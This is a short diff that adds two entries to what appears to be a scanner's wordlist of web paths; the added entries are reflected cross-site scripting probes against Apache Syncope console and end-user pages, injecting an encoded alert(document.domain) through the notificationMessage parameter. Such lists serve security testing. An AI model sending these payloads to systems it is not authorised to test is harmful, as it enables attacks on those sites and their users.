@@ -35,3 +35,5 @@
 /metrics/healthcheck
 /metrics/metrics
 /metrics/threads
+/syncope-console/login?notificationMessage={{str}}%27%2Balert%28document.domain%29%2B%27
+/syncope-enduser/?notificationMessage={{str}}%27%2Balert%28document.domain%29%2B%27
